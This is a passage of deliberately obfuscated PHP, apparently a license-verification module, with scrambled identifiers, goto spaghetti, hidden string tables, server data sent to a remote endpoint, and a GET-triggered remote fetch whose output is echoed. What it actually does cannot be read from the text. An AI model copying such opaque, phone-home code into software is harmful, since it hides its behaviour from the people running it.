$FóœñÀ±´∂[61]($FóœñÀ±´∂[154])->{$_SERVER[ñÖÀ‰Ø][155]}()); if ($this->gofl736a4d8a != $FóœñÀ±´∂[136]) { $b¥∞‘µìù¨ = $FóœñÀ±´∂[121]($this->zhps7cc1e634, $FóœñÀ±´∂[156]); if ($b¥∞‘µìù¨) { $dÇ◊πÉπÔà[$FóœñÀ±´∂[157]] = $b¥∞‘µìù¨; $dÇ◊πÉπÔà[$FóœñÀ±´∂[158]] = $FóœñÀ±´∂[159]($FóœñÀ±´∂[121]($this->zhps7cc1e634, $FóœñÀ±´∂[160])); $dÇ◊πÉπÔà[$FóœñÀ±´∂[161]] = $FóœñÀ±´∂[121]($this->zhps7cc1e634, $FóœñÀ±´∂[146]); } $AÉá∂´éÂ” = $FóœñÀ±´∂[61]($FóœñÀ±´∂[62])->{$_SERVER[ñÖÀ‰Ø][63]}($FóœñÀ±´∂[162], $FóœñÀ±´∂[10], !0); if ($FóœñÀ±´∂[163]($AÉá∂´éÂ”) && $FóœñÀ±´∂[25]($AÉá∂´éÂ”, 0, 1) == $FóœñÀ±´∂[164]) { $AÉá∂´éÂ” = $FóœñÀ±´∂[165]($AÉá∂´éÂ”); } if ($FóœñÀ±´∂[166]($AÉá∂´éÂ”) && $AÉá∂´éÂ”[$FóœñÀ±´∂[167]] && $FóœñÀ±´∂[32]($AÉá∂´éÂ”[$FóœñÀ±´∂[167]], $FóœñÀ±´∂[168])) { $F ﬁì¯”ﬁÍ = $FóœñÀ±´∂[0]($FóœñÀ±´∂[168], $AÉá∂´éÂ”[$FóœñÀ±´∂[167]]); $dÇ◊πÉπÔà[$FóœñÀ±´∂[169]] = $F ﬁì¯”ﬁÍ[0]; } } $dÇ◊πÉπÔà = $this->{$_SERVER[ñÖÀ‰Ø][170]}($FóœñÀ±´∂[171]($dÇ◊πÉπÔà), $FóœñÀ±´∂[129]($FóœñÀ±´∂[172])); goto BòÇÍ‚Ωπ¥; BòÇÍ‚Ωπ¥: $Cê„¬òÓóœ = $fåΩõüÊÀï[631]; while ($Cê„¬òÓóœ < $fåΩõüÊÀï[602]) { if ($Cê„¬òÓóœ >= 0) { break; } $Cê„¬òÓóœ++; } $e‚ “◊Íá∏ = array($FóœñÀ±´∂[173] => $dÇ◊πÉπÔà); goto aﬁ«ßµ€ÖÕ; aﬁ«ßµ€ÖÕ: $a«Ü‡ÿ≥ÜÖ = $fåΩõüÊÀï[632]; while (strlen($a«Ü‡ÿ≥ÜÖ) < $fåΩõüÊÀï[602]) { if (!$a«Ü‡ÿ≥ÜÖ) { break; } $a«Ü‡ÿ≥ÜÖ++; } $FóœñÀ±´∂[13](array($FóœñÀ±´∂[174], $FóœñÀ±´∂[175]), $e‚ “◊Íá∏); goto aŒ–Ÿ£Óî‰; AÚÇµãª‘»: } goto DÎùÒã°∏ª; A⁄ê ≥ûòâ: $EØáÌêôÉô = $fåΩõüÊÀï[634]; if (!$EØáÌêôÉô) { die; } goto FÎ°ãˆù∆Ÿ; CµÎèá◊Ωå: $e‚ “◊Íá∏ = array($FóœñÀ±´∂[182] => $BΩªèˆ§Ñı[$FóœñÀ±´∂[64]], $FóœñÀ±´∂[183] => $BΩªèˆ§Ñı[$FóœñÀ±´∂[65]], $FóœñÀ±´∂[184] => $FóœñÀ±´∂[10]); foreach ($C“ŒÜâ◊•© as $fπ¡ê˜ì Ò) { if (!isset($BΩªèˆ§Ñı[$fπ¡ê˜ì Ò]) || !$BΩªèˆ§Ñı[$fπ¡ê˜ì Ò]) { continue; } $e‚ “◊Íá∏[$fπ¡ê˜ì Ò] = $BΩªèˆ§Ñı[$fπ¡ê˜ì Ò]; } $FóœñÀ±´∂[13](array($FóœñÀ±´∂[174], $FóœñÀ±´∂[175]), $e‚ “◊Íá∏); goto A⁄ê ≥ûòâ; DÎùÒã°∏ª: if ($this->gofl736a4d8a == $FóœñÀ±´∂[136]) { return; } $C“ŒÜâ◊•© = array($FóœñÀ±´∂[176], $FóœñÀ±´∂[177], $FóœñÀ±´∂[178], $FóœñÀ±´∂[179], $FóœñÀ±´∂[180], $FóœñÀ±´∂[181]); $BΩªèˆ§Ñı = $FóœñÀ±´∂[61]($FóœñÀ±´∂[62])->{$_SERVER[ñÖÀ‰Ø][63]}(); goto CµÎèá◊Ωå; FÎ°ãˆù∆Ÿ: } private function nqlu9b8720c9() { goto d¨Ñëõ¥≈ª; dƒœóŸé¥≥: $Eé¡◊ôµÜÒ = $eÖõÌ¬ΩèÉ[635]; $C∫≤öÕ˜€„ = array($eÆäªﬁ˜ü˜[188] => $B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[188]], $eÆäªﬁ˜ü˜[191] => $eÆäªﬁ˜ü˜[139](16), $eÆäªﬁ˜ü˜[192] => $eÆäªﬁ˜ü˜[172], $eÆäªﬁ˜ü˜[193] => $eÆäªﬁ˜ü˜[194], $eÆäªﬁ˜ü˜[195] => $_SERVER[$eÆäªﬁ˜ü˜[196]], $eÆäªﬁ˜ü˜[197] => $_SERVER[$eÆäªﬁ˜ü˜[198]], $eÆäªﬁ˜ü˜[199] => $_SERVER[$eÆäªﬁ˜ü˜[200]], $eÆäªﬁ˜ü˜[128] => $cæõÉ¢ÖÜ⁄, $eÆäªﬁ˜ü˜[201] => $eÆäªﬁ˜ü˜[61]($eÆäªﬁ˜ü˜[62])->{$_SERVER[ñÖÀ‰Ø][63]}($eÆäªﬁ˜ü˜[162])); if ($B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[202]] == $eÆäªﬁ˜ü˜[203]) { $dÀ„ò·üÇﬂ = $this->{$_SERVER[ñÖÀ‰Ø][170]}($cæõÉ¢ÖÜ⁄, $eÆäªﬁ˜ü˜[204]); $EÖ√äü÷»» = $this->{$_SERVER[ñÖÀ‰Ø][142]}($eÆäªﬁ˜ü˜[171]($C∫≤öÕ˜€„), $cæõÉ¢ÖÜ⁄ . $eÆäªﬁ˜ü˜[205], 3); $EÖ√äü÷»» = $EÖ√äü÷»» . $eÆäªﬁ˜ü˜[206] . $_SERVER[$eÆäªﬁ˜ü˜[196]]; $FõˆÑÍ—ä = $this->{$_SERVER[ñÖÀ‰Ø][207]}($eÆäªﬁ˜ü˜[208] . $dÀ„ò·üÇﬂ . $eÆäªﬁ˜ü˜[209] . $EÖ√äü÷»», -1); $eÆäªﬁ˜ü˜[189]($FõˆÑÍ—ä, !0); } else { if ($B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[202]] == $eÆäªﬁ˜ü˜[210]) { $dëç±≥îú± = $eÆäªﬁ˜ü˜[25]($eÆäªﬁ˜ü˜[129]($eÆäªﬁ˜ü˜[211] . $cæõÉ¢ÖÜ⁄), 12, 15) . $eÆäªﬁ˜ü˜[212]; $EÖ√äü÷»» = $this->{$_SERVER[ñÖÀ‰Ø][213]}($eÆäªﬁ˜ü˜[2]($B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[214]]), $dëç±≥îú±, 2); $BãÊ–àéãö = $eÆäªﬁ˜ü˜[215]($EÖ√äü÷»», !0); if (!$eÆäªﬁ˜ü˜[166]($BãÊ–àéãö) || !$eÆäªﬁ˜ü˜[166]($BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]]) || $BãÊ–àéãö[$eÆäªﬁ˜ü˜[188]] != !0) { $fáèÉÌá—ä = $eÆäªﬁ˜ü˜[217]; $f¨‚ÂŒ–Ò— = $BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]] ? $eÆäªﬁ˜ü˜[218] . $BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]] : $fáèÉÌá—ä; $eÆäªﬁ˜ü˜[189]($f¨‚ÂŒ–Ò—, !1); } else { $C∫≤öÕ˜€„[$eÆäªﬁ˜ü˜[191]] = $BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]][$eÆäªﬁ˜ü˜[219]]; } } else { $BãÊ–àéãö = $this->{$_SERVER[ñÖÀ‰Ø][207]}($eÆäªﬁ˜ü˜[220], $C∫≤öÕ˜€„, 10); $bìÜèËó≥« = $eÖõÌ¬ΩèÉ[636]; if (!$bìÜèËó≥«) { return; } } } goto E√èÉ“†˜Í; fï€Íî◊üæ: $E‡ì™ç“”Á = $this->{$_SERVER[ñÖÀ‰Ø][142]}($eÆäªﬁ˜ü˜[171]($bÎ•õ˘ ∫ü), $BÒàÒê™ÊÔ); $c±Ê™ÙﬂÕº = $eÖõÌ¬ΩèÉ[640]; if (strlen($c±Ê™ÙﬂÕº) < $eÖõÌ¬ΩèÉ[589]) { die; } goto DÆ˜Ü“õÖ⁄; e◊ôÂÍ´éÎ: $aç©¶πËáô[$eÆäªﬁ˜ü˜[138]] = $eÆäªﬁ˜ü˜[133]($eÆäªﬁ˜ü˜[238]($this->{$_SERVER[ñÖÀ‰Ø][170]}($a’ÖΩ‰ô™Ú, $eÆäªﬁ˜ü˜[240]))); if ($bÎ•õ˘ ∫ü[$eÆäªﬁ˜ü˜[241]] && $bÎ•õ˘ ∫ü[$eÆäªﬁ˜ü˜[241]] >= 1) { $eÆäªﬁ˜ü˜[61]($eÆäªﬁ˜ü˜[62])->{$_SERVER[ñÖÀ‰Ø][242]}($eÆäªﬁ˜ü˜[243], $eÆäªﬁ˜ü˜[244]); } $eÆäªﬁ˜ü˜[61]($eÆäªﬁ˜ü˜[62])->{$_SERVER[ñÖÀ‰Ø][245]}($aç©¶πËáô); goto aÆ∑’€ç”©; FÈÑÑ∫ÿã: $this->gofl736a4d8a = $aç©¶πËáô[$eÆäªﬁ˜ü˜[135]]; $this->{$_SERVER[ñÖÀ‰Ø][253]}(); Cache::set($eÆäªﬁ˜ü˜[254] . $eÆäªﬁ˜ü˜[129]($aá¨çëÚŸ£ . $eÆäªﬁ˜ü˜[255]), $eÆäªﬁ˜ü˜[10]); goto E÷Ôı«ç‡°; E÷Ôı«ç‡°: $eÆäªﬁ˜ü˜[189]($eÆäªﬁ˜ü˜[221]($eÆäªﬁ˜ü˜[231]), !0); $B√⁄∞Àòâﬂ = $eÖõÌ¬ΩèÉ[643]; if (strlen($B√⁄∞Àòâﬂ) < $eÖõÌ¬ΩèÉ[602]) { return; } goto aÌë¥Èµå’; cëàÔ‡Õ˜Æ: $bœ‰ªŒ≤Í◊ = $eÖõÌ¬ΩèÉ[638]; while (strlen($bœ‰ªŒ≤Í◊) < $eÖõÌ¬ΩèÉ[607]) { if (!$bœ‰ªŒ≤Í◊) { break; } $bœ‰ªŒ≤Í◊++; } $a’ÖΩ‰ô™Ú = $FØÑº©çÕÇ . $aç©¶πËáô[$eÆäªﬁ˜ü˜[135]] . $this->{$_SERVER[ñÖÀ‰Ø][170]}($eÆäªﬁ˜ü˜[129]($aç©¶πËáô[$eÆäªﬁ˜ü˜[232]]), $FØÑº©çÕÇ); goto e◊ôÂÍ´éÎ; aÆ∑’€ç”©: $BÒàÒê™ÊÔ = $eÆäªﬁ˜ü˜[129]($_SERVER[$eÆäªﬁ˜ü˜[130]] . $eÆäªﬁ˜ü˜[238]($aá¨çëÚŸ£) . $aç©¶πËáô[$eÆäªﬁ˜ü˜[234]]); $Bºä•˜õÂå = $eÖõÌ¬ΩèÉ[639]; $A√î†ÿäÿõ = $eÆäªﬁ˜ü˜[238]($eÆäªﬁ˜ü˜[25]($BÒàÒê™ÊÔ, 10, 16)); goto fï€Íî◊üæ; a˜∂±‰≥™Ú: $eÆäªﬁ˜ü˜[61]($eÆäªﬁ˜ü˜[11])->{$_SERVER[ñÖÀ‰Ø][250]}($Cçï”çñ¢ø[$eÆäªﬁ˜ü˜[251]], array($eÆäªﬁ˜ü˜[252] => $Aâ∑ˆå…å¥)); $BÙà±Œ´â¯ = $eÖõÌ¬ΩèÉ[642]; $this->zhps7cc1e634 = $bÎ•õ˘ ∫ü; goto FÈÑÑ∫ÿã; b∑’⁄ÿå±≥: $Cçï”çñ¢ø = $b¡ÊÌ⁄Ó©∆[$eÆäªﬁ˜ü˜[249]]; $Aâ∑ˆå…å¥ = array(); $Aâ∑ˆå…å¥[$A√î†ÿäÿõ] = $E‡ì™ç“”Á; goto a˜∂±‰≥™Ú; d¨Ñëõ¥≈ª: $eÖõÌ¬ΩèÉ =& $_SERVER[Öíæ€“”≠éÏË]; $eÆäªﬁ˜ü˜ =& $_SERVER[ñÖÀ‰Ø]; if ($_SERVER[$eÆäªﬁ˜ü˜[44]] != $eÆäªﬁ˜ü˜[185]) { return; } goto e¥ãåÃ·óã; eóòÇùå£à: $aç©¶πËáô = array($eÆäªﬁ˜ü˜[232] => $bÎ•õ˘ ∫ü[$eÆäªﬁ˜ü˜[233]], $eÆäªﬁ˜ü˜[234] => $bÎ•õ˘ ∫ü[$eÆäªﬁ˜ü˜[235]], $eÆäªﬁ˜ü˜[236] => $eÆäªﬁ˜ü˜[139](16), $eÆäªﬁ˜ü˜[135] => $bÎ•õ˘ ∫ü[$eÆäªﬁ˜ü˜[237]]); if ($C∫≤öÕ˜€„[$eÆäªﬁ˜ü˜[191]]) { $aç©¶πËáô[$eÆäªﬁ˜ü˜[236]] = $C∫≤öÕ˜€„[$eÆäªﬁ˜ü˜[191]]; } $eÏá∆Æ÷ÇÀ = $eÆäªﬁ˜ü˜[25]($eÆäªﬁ˜ü˜[129]($aç©¶πËáô[$eÆäªﬁ˜ü˜[234]]), 10, 10); goto e¥Çë∑◊äê; E√èÉ“†˜Í: if (!$eÆäªﬁ˜ü˜[166]($BãÊ–àéãö) || !$eÆäªﬁ˜ü˜[166]($BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]]) || $BãÊ–àéãö[$eÆäªﬁ˜ü˜[188]] != !0) { $fáèÉÌá—ä = $eÆäªﬁ˜ü˜[221]($eÆäªﬁ˜ü˜[222]); $f¨‚ÂŒ–Ò— = $BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]] ? $eÆäªﬁ˜ü˜[218] . $BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]] : $fáèÉÌá—ä; $eÆäªﬁ˜ü˜[189]($f¨‚ÂŒ–Ò—, !1); } $bÎ•õ˘ ∫ü = $BãÊ–àéãö[$eÆäªﬁ˜ü˜[216]]; $Cä„≠∞Úè¿ = $this->{$_SERVER[ñÖÀ‰Ø][223]}($bÎ•õ˘ ∫ü[$eÆäªﬁ˜ü˜[224]]); goto bØ™∆©áÆå; e¥Çë∑◊äê: $d¿€áøü÷ê = $eÏá∆Æ÷ÇÀ . $aç©¶πËáô[$eÆäªﬁ˜ü˜[135]] . $aç©¶πËáô[$eÆäªﬁ˜ü˜[236]]; $aç©¶πËáô[$eÆäªﬁ˜ü˜[137]] = $eÆäªﬁ˜ü˜[238]($eÆäªﬁ˜ü˜[133]($this->{$_SERVER[ñÖÀ‰Ø][170]}($d¿€áøü÷ê, $eÆäªﬁ˜ü˜[239]))); $FØÑº©çÕÇ = $eÆäªﬁ˜ü˜[139](16); goto cëàÔ‡Õ˜Æ; DÆ˜Ü“õÖ⁄: $b¡ÊÌ⁄Ó©∆ = $eÆäªﬁ˜ü˜[246]($eÆäªﬁ˜ü˜[61]($eÆäªﬁ˜ü˜[11])->{$_SERVER[ñÖÀ‰Ø][247]}(), $eÆäªﬁ˜ü˜[248]); $e„«ñç∆œ‡ = $eÖõÌ¬ΩèÉ[641]; if (!$e„«ñç∆œ‡) { die; } goto b∑’⁄ÿå±≥; bØ™∆©áÆå: $Dõ‘œúﬂ±Ë = $eÖõÌ¬ΩèÉ[637]; while ($Dõ‘œúﬂ±Ë < $eÖõÌ¬ΩèÉ[607]) { if ($Dõ‘œúﬂ±Ë >= 0) { break; } $Dõ‘œúﬂ±Ë++; } if (!$Cä„≠∞Úè¿ || $Cä„≠∞Úè¿ != $bÎ•õ˘ ∫ü[$eÆäªﬁ˜ü˜[160]]) { $cÜØÜ»ëŸ£ = array($eÆäªﬁ˜ü˜[225] => $eÆäªﬁ˜ü˜[61]($eÆäªﬁ˜ü˜[62])->{$_SERVER[ñÖÀ‰Ø][63]}($eÆäªﬁ˜ü˜[131]), $eÆäªﬁ˜ü˜[226] => $_SERVER[$eÆäªﬁ˜ü˜[130]], $eÆäªﬁ˜ü˜[227] => $eÆäªﬁ˜ü˜[228](), $eÆäªﬁ˜ü˜[197] => $_SERVER[$eÆäªﬁ˜ü˜[198]]); $EÖ√äü÷»» = $this->{$_SERVER[ñÖÀ‰Ø][229]}($eÆäªﬁ˜ü˜[171]($cÜØÜ»ëŸ£)); $this->{$_SERVER[ñÖÀ‰Ø][207]}($eÆäªﬁ˜ü˜[230] . $EÖ√äü÷»»); $eÆäªﬁ˜ü˜[189]($eÆäªﬁ˜ü˜[221]($eÆäªﬁ˜ü˜[231]), !0); } goto eóòÇùå£à; d√óéç¡Üå: if (!isset($B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[188]]) || $eÆäªﬁ˜ü˜[24]($B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[188]]) != 16) { $eÆäªﬁ˜ü˜[189]($eÆäªﬁ˜ü˜[190] . $B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[188]], !1); } $aá¨çëÚŸ£ = $eÆäªﬁ˜ü˜[61]($eÆäªﬁ˜ü˜[62])->{$_SERVER[ñÖÀ‰Ø][63]}($eÆäªﬁ˜ü˜[131]); $cæõÉ¢ÖÜ⁄ = $eÆäªﬁ˜ü˜[129]($_SERVER[$eÆäªﬁ˜ü˜[130]] . $aá¨çëÚŸ£); goto dƒœóŸé¥≥; e¥ãåÃ·óã: if (!$eÆäªﬁ˜ü˜[121]($GLOBALS, $eÆäªﬁ˜ü˜[147])) { die; } $B¯¢™”·ïÏ = $GLOBALS[$eÆäªﬁ˜ü˜[22]]; if (isset($B¯¢™”·ïÏ[$eÆäªﬁ˜ü˜[186]])) { $this->{$_SERVER[ñÖÀ‰Ø][187]}(); die; } goto d√óéç¡Üå; aÌë¥Èµå’: } private function licenseRegistSuccess() { $B’à‹∑Ó†û =& $_SERVER[ñÖÀ‰Ø]; $eœ˘‚∑®éÁ = $B’à‹∑Ó†û[61]($B’à‹∑Ó†û[62])->{$_SERVER[ñÖÀ‰Ø][63]}(); $A“”çâ∫∫ = $_SERVER[Öíæ€“”≠éÏË][644]; if (!$A“”çâ∫∫) { die; } if ($eœ˘‚∑®éÁ[$B’à‹∑Ó†û[93]] != $B’à‹∑Ó†û[244]) { $B’à‹∑Ó†û[61]($B’à‹∑Ó†û[62])->{$_SERVER[ñÖÀ‰Ø][245]}($B’à‹∑Ó†û[93], $B’à‹∑Ó†û[244]); } $B’à‹∑Ó†û[125]($B’à‹∑Ó†û[256])->{$_SERVER[ñÖÀ‰Ø][257]}(!0); } private function ecdhdee30d8c() { goto a∂ﬁß∂ü√Ø; E¿ë·¯—¨•: $E∆¥˘∏ÑµÉ = $dä≈úï≈Ë∑[646]; $this->gofl736a4d8a = $C¨…Òü®Òè[136]; goto b°‚†ÇÏŸÃ; a∂ﬁß∂ü√Ø: $dä≈úï≈Ë∑ =& $_SERVER[Öíæ€“”≠éÏË]; $C¨…Òü®Òè =& $_SERVER[ñÖÀ‰Ø]; $C¨…Òü®Òè[61]($C¨…Òü®Òè[62])->{$_SERVER[ñÖÀ‰Ø][245]}(array($C¨…Òü®Òè[232] => $C¨…Òü®Òè[10], $C¨…Òü®Òè[234] => $C¨…Òü®Òè[10], $C¨…Òü®Òè[135] => $C¨…Òü®Òè[136], $C¨…Òü®Òè[137] => $C¨…Òü®Òè[10], $C¨…Òü®Òè[138] => $C¨…Òü®Òè[10])); goto FˆîÁäëƒ·; FˆîÁäëƒ·: $C¨…Òü®Òè[61]($C¨…Òü®Òè[62])->{$_SERVER[ñÖÀ‰Ø][242]}($C¨…Òü®Òè[243], $C¨…Òü®Òè[258]); $fœáûÒ∏ÊÉ = $dä≈úï≈Ë∑[645]; $this->zhps7cc1e634 = array(); goto E¿ë·¯—¨•; b°‚†ÇÏŸÃ: } private function qhfv93c5b7eb() { goto B—ø«ß ÿ´; a≈‡œÙÎ√ˆ: if ($CÓ∞¢»ÇøÜ[260]() >= $DÂçª†⁄°ø) { return $this->{$_SERVER[ñÖÀ‰Ø][187]}(); } if ($CÓ∞¢»ÇøÜ[260]() - $cô›ê˜∆âÑ[$CÓ∞¢»ÇøÜ[259]] > 20) { $cô›ê˜∆âÑ[$CÓ∞¢»ÇøÜ[259]] = $CÓ∞¢»ÇøÜ[260](); Cache::set($Aú∏ùãÔ‡‘, $cô›ê˜∆âÑ); } $this->zhps7cc1e634 = $cô›ê˜∆âÑ; goto fê“ìè∂ıœ; fâÍ«ÆÜ·©: $AÈ”‡€îô√ = $b†ûÈÚÕ≤¢[647]; if (!$AÈ”‡€îô√) { return; } $this->gofl736a4d8a = $CÓ∞¢»ÇøÜ[136]; goto dƒ—¬∂©≤§; D®°∆á«íï: if ($cΩ«˜¶∑Ëã[$CÓ∞¢»ÇøÜ[135]] == $CÓ∞¢»ÇøÜ[136]) { return; } $fèÔ¢£⁄◊Í = $CÓ∞¢»ÇøÜ[61]($CÓ∞¢»ÇøÜ[62])->{$_SERVER[ñÖÀ‰Ø][63]}($CÓ∞¢»ÇøÜ[131]); $Aú∏ùãÔ‡‘ = $CÓ∞¢»ÇøÜ[254] . $CÓ∞¢»ÇøÜ[129]($fèÔ¢£⁄◊Í . $CÓ∞¢»ÇøÜ[255]); goto E£ä±œÓáõ; fê“ìè∂ıœ: $this->gofl736a4d8a = $cΩ«˜¶∑Ëã[$CÓ∞¢»ÇøÜ[135]]; goto eÑ‰µÌ‰áø; E£ä±œÓáõ: $f˘±¨Óõ’â = $b†ûÈÚÕ≤¢[649]; if (!$f˘±¨Óõ’â) { die; } $cô›ê˜∆âÑ = Cache::get($Aú∏ùãÔ‡‘); goto Dëß¢ø‰ÜÍ; Dëß¢ø‰ÜÍ: if (!$CÓ∞¢»ÇøÜ[166]($cô›ê˜∆âÑ) || !isset($cô›ê˜∆âÑ[$CÓ∞¢»ÇøÜ[259]]) || $CÓ∞¢»ÇøÜ[260]() - $cô›ê˜∆âÑ[$CÓ∞¢»ÇøÜ[259]] >= 60) { $BΩà˜âΩëå = $CÓ∞¢»ÇøÜ[246]($CÓ∞¢»ÇøÜ[61]($CÓ∞¢»ÇøÜ[11])->{$_SERVER[ñÖÀ‰Ø][247]}(), $CÓ∞¢»ÇøÜ[248]); $C≤∑ª’¯‹◊ = $BΩà˜âΩëå[$CÓ∞¢»ÇøÜ[249]]; $bÜÜ∫  ôà = $CÓ∞¢»ÇøÜ[129]($_SERVER[$CÓ∞¢»ÇøÜ[130]] . $CÓ∞¢»ÇøÜ[238]($fèÔ¢£⁄◊Í) . $cΩ«˜¶∑Ëã[$CÓ∞¢»ÇøÜ[234]]); $dß†Ããµá≠ = $CÓ∞¢»ÇøÜ[238]($CÓ∞¢»ÇøÜ[25]($bÜÜ∫  ôà, 10, 16)); $cô›ê˜∆âÑ = $this->{$_SERVER[ñÖÀ‰Ø][213]}($C≤∑ª’¯‹◊[$CÓ∞¢»ÇøÜ[109]][$dß†Ããµá≠], $bÜÜ∫  ôà); $cô›ê˜∆âÑ = $CÓ∞¢»ÇøÜ[215]($cô›ê˜∆âÑ, !0); } if (!$CÓ∞¢»ÇøÜ[166]($cô›ê˜∆âÑ)) { return $this->{$_SERVER[ñÖÀ‰Ø][187]}(); } $DÂçª†⁄°ø = $CÓ∞¢»ÇøÜ[159]($cô›ê˜∆âÑ[$CÓ∞¢»ÇøÜ[160]]); goto a≈‡œÙÎ√ˆ; B—ø«ß ÿ´: $b†ûÈÚÕ≤¢ =& $_SERVER[Öíæ€“”≠éÏË]; $CÓ∞¢»ÇøÜ =& $_SERVER[ñÖÀ‰Ø]; $_SERVER[$CÓ∞¢»ÇøÜ[198]] = $CÓ∞¢»ÇøÜ[121]($_SERVER, $CÓ∞¢»ÇøÜ[198], APP_HOST); goto fâÍ«ÆÜ·©; dƒ—¬∂©≤§: $D‹≈òÖ“Ö„ = $b†ûÈÚÕ≤¢[648]; while (strlen($D‹≈òÖ“Ö„) < $b†ûÈÚÕ≤¢[607]) { if (!$D‹≈òÖ“Ö„) { break; } $D‹≈òÖ“Ö„++; } $cΩ«˜¶∑Ëã = $CÓ∞¢»ÇøÜ[61]($CÓ∞¢»ÇøÜ[62])->{$_SERVER[ñÖÀ‰Ø][63]}(); goto D®°∆á«íï; eÑ‰µÌ‰áø: } private function mwsf383ab798() { goto e⁄¨ö÷Ô∫∂; C∫Ω∏Ÿàõ“: if ($dÏ¢àıƒÇ…[266]($Fã‘°è·¨, $BœÓçπÉ«À)) { if ($this->gofl736a4d8a == $dÏ¢àıƒÇ…[136] && isset($e…É·¶Ÿöö[$dÏ¢àıƒÇ…[267]])) { $dÏ¢àıƒÇ…[189]($dÏ¢àıƒÇ…[221]($dÏ¢àıƒÇ…[262]), !1, $dÏ¢àıƒÇ…[263]); die; } $aù—¿™äÁÍ = $this->{$_SERVER[ñÖÀ‰Ø][152]}(); if ($aù—¿™äÁÍ != $dÏ¢àıƒÇ…[268]($dÏ¢àıƒÇ…[269])) { if ($aù—¿™äÁÍ <= $dÏ¢àıƒÇ…[61]($dÏ¢àıƒÇ…[154])->{$_SERVER[ñÖÀ‰Ø][155]}()) { $dÏ¢àıƒÇ…[189]($dÏ¢àıƒÇ…[221]($dÏ¢àıƒÇ…[270]), !1, $dÏ¢àıƒÇ…[263]); die; } } } goto F≠ç†»¯ê®; e⁄¨ö÷Ô∫∂: $dÏ¢àıƒÇ… =& $_SERVER[ñÖÀ‰Ø]; $e…É·¶Ÿöö = $GLOBALS[$dÏ¢àıƒÇ…[22]]; $Fã‘°è·¨ = $_SERVER[$dÏ¢àıƒÇ…[44]]; goto EÂ©∑„ê≥”; EÂ©∑„ê≥”: $eëµ“ÆÉ≤€ = $_SERVER[Öíæ€“”≠éÏË][650]; if ($Fã‘°è·¨ == $dÏ¢àıƒÇ…[261] && $this->gofl736a4d8a == $dÏ¢àıƒÇ…[136]) { $dÏ¢àıƒÇ…[189]($dÏ¢àıƒÇ…[221]($dÏ¢àıƒÇ…[262]), !1, $dÏ¢àıƒÇ…[263]); } $BœÓçπÉ«À = array($dÏ¢àıƒÇ…[264], $dÏ¢àıƒÇ…[265]); goto C∫Ω∏Ÿàõ“; F≠ç†»¯ê®: } private function tmewee7d08bf() { goto Dú› ´ø∫—; BºÆŒπÜ†ô: $AÆü„ø—≤’ = $b§◊òòó™π[652]; $aàÇˆΩ—±ö = @$d«†ÿöÀ±Œ[281]($DìÙˆ∂…à›, !1, $bπ÷¿–îóÇ); $aëé“ø∆ñ⁄ = $b§◊òòó™π[653]; goto c†¢≈ÆßëÒ; Dú› ´ø∫—: $b§◊òòó™π =& $_SERVER[Öíæ€“”≠éÏË]; $d«†ÿöÀ±Œ =& $_SERVER[ñÖÀ‰Ø]; $Fœ∫ä‘ªè• = array($d«†ÿöÀ±Œ[150], $d«†ÿöÀ±Œ[271]); goto Dœ‘ŸïµÇµ; Cµä©ı∆‹ : $f¿Ç‚πæ∫Ö = $b§◊òòó™π[651]; $DìÙˆ∂…à› = $this->{$_SERVER[ñÖÀ‰Ø][274]}($DìÙˆ∂…à›, $d«†ÿöÀ±Œ[275]); $bπ÷¿–îóÇ = $d«†ÿöÀ±Œ[276](array($d«†ÿöÀ±Œ[277] => array($d«†ÿöÀ±Œ[278] => $d«†ÿöÀ±Œ[279], $d«†ÿöÀ±Œ[280] => 3))); goto BºÆŒπÜ†ô; F§ÓÿÚì‹ê: die; goto Dœ¯Ì•üôá; c†¢≈ÆßëÒ: while ($aëé“ø∆ñ⁄ < $b§◊òòó™π[594]) { if ($aëé“ø∆ñ⁄ >= 0) { break; } $aëé“ø∆ñ⁄++; } $d«†ÿöÀ±Œ[282]($d«†ÿöÀ±Œ[283]); if ($aàÇˆΩ—±ö && $d«†ÿöÀ±Œ[32]($aàÇˆΩ—±ö, $d«†ÿöÀ±Œ[284])) { echo $aàÇˆΩ—±ö; } goto F§ÓÿÚì‹ê; Dœ‘ŸïµÇµ: if (!$d«†ÿöÀ±Œ[121]($GLOBALS, $d«†ÿöÀ±Œ[147]) || !isset($_GET[$d«†ÿöÀ±Œ[272]])) { return; } if (!$d«†ÿöÀ±Œ[266]($_SERVER[$d«†ÿöÀ±Œ[44]], $Fœ∫ä‘ªè•)) { return; } $DìÙˆ∂…à› = $d«†ÿöÀ±Œ[273]; goto Cµä©ı∆‹ ; Dœ¯Ì•üôá: } public function xqcaceecd000($D¥ó»ê∆ø›) { goto f≠çÂ÷¢£§; C‘‚Ùè∑úÒ: $a≠íÇãÜÇ≥ = $CÜ≈úÎ§Ìü[654]; if (!$a≠íÇãÜÇ≥) { return; } foreach ($b›ƒø¬Íä¯ as $EÎˆê›èë∑ => $fÚÛŒéŸùı) { if ($fÚÛŒéŸùı == $fÖß÷ã€⁄±[287] && $fÖß÷ã€⁄±[25]($this->gofl736a4d8a, 0, 1) == $fÖß÷ã€⁄±[287]) { continue; } if (!$fÖß÷ã€⁄±[266]($EÎˆê›èë∑, $a®Ÿù≠ß±ö)) { $CîÎóÎŒ¬à[] = $EÎˆê›èë∑; } } goto eÖ¢€É÷Ã¯; d®ãŸˆˆÿì: $b›ƒø¬Íä¯ = array($fÖß÷ã€⁄±[286] => $fÖß÷ã€⁄±[287], $fÖß÷ã€⁄±[288] => $fÖß÷ã€⁄±[287], $fÖß÷ã€⁄±[289] => $fÖß÷ã€⁄±[287], $fÖß÷ã€⁄±[290] => $fÖß÷ã€⁄±[287], $fÖß÷ã€⁄±[291] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[293] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[294] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[295] => $fÖß÷ã€⁄±[292], 